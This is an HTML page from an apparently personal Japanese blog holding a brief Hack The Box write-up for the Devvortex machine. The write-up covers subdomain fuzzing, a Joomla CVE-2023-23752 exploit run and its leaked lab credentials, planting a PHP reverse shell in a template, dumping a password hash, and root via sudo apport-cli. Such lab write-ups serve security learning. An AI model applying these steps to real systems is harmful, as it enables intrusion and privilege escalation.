@@ -1,0 +1,266 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB_devvortex // お茶は綾鷹派</title>
+    <link rel="shortcut icon" href="../../favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.117.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="KoheiDoi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="../../css/main.min.3fb9065bb18f896621f7ce2fad5bbbafdf9954fbe571b5e41c6e59a8cbacc8ef.css" />
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB_devvortex"/>
+<meta name="twitter:description" content="user nmap ssh, http http まず ffuf で subdomain を探す ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://devvortex.htb -H &quot;Host: FUZZ.devvortex.htb&quot; -fw 4 -t 100 次にディレクトリを探す ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://dev.vortex.htb/FUZZ -t 100 -ic /administrator が見つかる Joomla! で動いている Joomla! https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla version を見つける /administrator/manifests/files/joomla.xml CVE が刺さる https://github.com/Acceis/exploit-CVE-2023-23752 ruby exploit.rb http://dev.devvortex.htb Users [649] lewis (lewis) - lewis@devvortex.htb - Super Users [650] logan paul (logan) - logan@devvortex.htb - Registered Site info Site name: Development Editor: tinymce Captcha: 0 Access: 1 Debug status: false Database info DB type: mysqli DB host: localhost DB user: lewis DB password: P4ntherg0t1n5r3c0n## DB name: joomla DB prefix: sd4fg_ DB encryption 0 revshell Template -&gt; Customise(Cassiopeia) を編集する error."/>
+
+    <meta property="og:title" content="HTB_devvortex" />
+<meta property="og:description" content="user nmap ssh, http http まず ffuf で subdomain を探す ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://devvortex.htb -H &quot;Host: FUZZ.devvortex.htb&quot; -fw 4 -t 100 次にディレクトリを探す ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://dev.vortex.htb/FUZZ -t 100 -ic /administrator が見つかる Joomla! で動いている Joomla! https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla version を見つける /administrator/manifests/files/joomla.xml CVE が刺さる https://github.com/Acceis/exploit-CVE-2023-23752 ruby exploit.rb http://dev.devvortex.htb Users [649] lewis (lewis) - lewis@devvortex.htb - Super Users [650] logan paul (logan) - logan@devvortex.htb - Registered Site info Site name: Development Editor: tinymce Captcha: 0 Access: 1 Debug status: false Database info DB type: mysqli DB host: localhost DB user: lewis DB password: P4ntherg0t1n5r3c0n## DB name: joomla DB prefix: sd4fg_ DB encryption 0 revshell Template -&gt; Customise(Cassiopeia) を編集する error." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://side-realms.github.io/writeup/htb_devvortex/" /><meta property="article:section" content="writeup" />
+<meta property="article:published_time" content="2024-06-08T15:25:30+09:00" />
+<meta property="article:modified_time" content="2024-06-08T15:25:30+09:00" />
+
+    <style>
+      .hr1 {
+  position: relative;
+	height: 3px;
+	border-width: 0;
+	background-color: #00bcd4;
+	background-image: -webkit-linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+	background-image: linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+}
+    </style>
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://side-realms.github.io"><img class="app-header-avatar" src="../../images/avatar.jpg" alt="KoheiDoi" /></a>
+      <span class="app-header-title">お茶は綾鷹派</span>
+      <p>最近は颯も好き</p>
+      <p><font size="1">内容の正確性は保証していません🐶</font></p>
+      <nav class="app-header-menu">
+          <font size="5">
+          <a class="app-header-menu-item" href="../../">Home</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="../../log">life log</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="../../treasure/">treasure trove</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <nav class="app-header-menu">
+          <font size="4">
+          <a class="app-header-menu-item" href="../../sound">sound</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../container">container</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../hardware">hardware</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../writeup">writeup</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../other">other</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <div class="app-header-social">
+        
+          <a href="https://github.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+      </div>
+      <div class="app-footer-copyright">
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB_devvortex</h1>
+      </style>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jun 8, 2024
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          1 min read
+        </div>
+      </div>
+      <hr>
+    </header>
+    <div class="post-content">
+      <h2 id="user">user</h2>
+<ul>
+<li>nmap
+<ul>
+<li>ssh, http</li>
+</ul>
+</li>
+<li>http
+<ul>
+<li>まず ffuf で subdomain を探す
+<ul>
+<li><code>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://devvortex.htb -H &quot;Host: FUZZ.devvortex.htb&quot; -fw 4 -t 100</code></li>
+</ul>
+</li>
+<li>次にディレクトリを探す
+<ul>
+<li><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://dev.vortex.htb/FUZZ -t 100 -ic</code></li>
+</ul>
+</li>
+<li><code>/administrator</code> が見つかる</li>
+<li>Joomla! で動いている</li>
+</ul>
+</li>
+<li>Joomla!
+<ul>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla</a></li>
+<li>version を見つける
+<ul>
+<li><code>/administrator/manifests/files/joomla.xml</code></li>
+</ul>
+</li>
+<li>CVE が刺さる
+<ul>
+<li><a href="https://github.com/Acceis/exploit-CVE-2023-23752">https://github.com/Acceis/exploit-CVE-2023-23752</a></li>
+<li><code>ruby exploit.rb http://dev.devvortex.htb</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>649<span style="color:#f92672">]</span> lewis <span style="color:#f92672">(</span>lewis<span style="color:#f92672">)</span> - lewis@devvortex.htb - Super Users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>650<span style="color:#f92672">]</span> logan paul <span style="color:#f92672">(</span>logan<span style="color:#f92672">)</span> - logan@devvortex.htb - Registered
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Site info
+</span></span><span style="display:flex;"><span>Site name: Development
+</span></span><span style="display:flex;"><span>Editor: tinymce
+</span></span><span style="display:flex;"><span>Captcha: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Access: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Debug status: false
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Database info
+</span></span><span style="display:flex;"><span>DB type: mysqli
+</span></span><span style="display:flex;"><span>DB host: localhost
+</span></span><span style="display:flex;"><span>DB user: lewis
+</span></span><span style="display:flex;"><span>DB password: P4ntherg0t1n5r3c0n##
+</span></span><span style="display:flex;"><span>DB name: joomla
+</span></span><span style="display:flex;"><span>DB prefix: sd4fg_
+</span></span><span style="display:flex;"><span>DB encryption <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><ul>
+<li>revshell
+<ul>
+<li>Template -&gt; Customise(Cassiopeia) を編集する</li>
+<li>error.php に php revshell を入れる(index.php には書き込み権限が無い)</li>
+<li>Template Preview でトリガーする</li>
+</ul>
+</li>
+<li>logan
+<ul>
+<li>Joomla! の DB を検索すると mysql が使われていると分かる</li>
+<li>mysql にログインする
+<ul>
+<li><code>mysql -u lewis -p</code></li>
+<li><code>show tables;</code></li>
+<li><code>select joomla;</code></li>
+<li><code>use joomla;</code></li>
+<li><code>show tables;</code></li>
+<li><code>select * FROM sd4fg_users;</code></li>
+</ul>
+</li>
+<li>logan のハッシュパスワードが見つかる
+<ul>
+<li><code>$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12</code></li>
+</ul>
+</li>
+<li><code>su logan</code></li>
+<li>uset.txt</li>
+</ul>
+</li>
+</ul>
+<h2 id="root">root</h2>
+<ul>
+<li><code>sudo -l</code>
+<ul>
+<li><code>/usr/bin/apport-cli</code> が使える</li>
+<li><a href="https://0xd1eg0.medium.com/cve-2023-1326-poc-c8f2a59d0e00">https://0xd1eg0.medium.com/cve-2023-1326-poc-c8f2a59d0e00</a></li>
+</ul>
+</li>
+<li>apport-cli
+<ul>
+<li><code>sudo /usr/bin/apport-cli --file-bug</code></li>
+<li>1 -&gt; 2 -&gt; V -&gt; Enter -&gt; <code>!/bin/bash</code></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css" integrity="sha384-dbVIfZGuN1Yq7/1Ocstc1lUEm+AT+/rCkibIcC/OmWo5f0EA48Vf8CytHzGrSwbQ" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js" integrity="sha384-2BKqo+exmr9su6dir+qCw08N2ZKRucY4PrGQPPWU1A7FtlCGjmEGFqXCv5nyM5Ij" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}]
+    });
+  });
+</script>
+      
+    </div>
+  </article>
+  <hr>
+  <p>© side-realms All rights reserved.</p>
+
+    </main>
+  </body>
+</html>
